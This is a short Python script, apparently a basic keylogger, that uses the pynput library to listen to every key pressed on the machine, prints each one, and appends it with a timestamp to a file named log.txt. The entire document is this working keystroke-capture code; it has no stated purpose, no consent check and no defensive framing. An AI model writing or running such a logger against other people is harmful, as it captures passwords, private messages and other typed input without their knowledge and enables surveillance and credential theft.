from pynput.keyboard import Listener
import datetime
def data_file(keystroke):
    print(keystroke)
    data = str(keystroke)
    data= data.replace("'", "")

    if data == 'Key.space':
        data = ' '
    if data == "Key.enter":
       data = "\n"

    with open("log.txt", 'a') as f:
      f.write(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f'")+":" +data+"\n")

with Listener(on_press=data_file) as l:
    l.join()
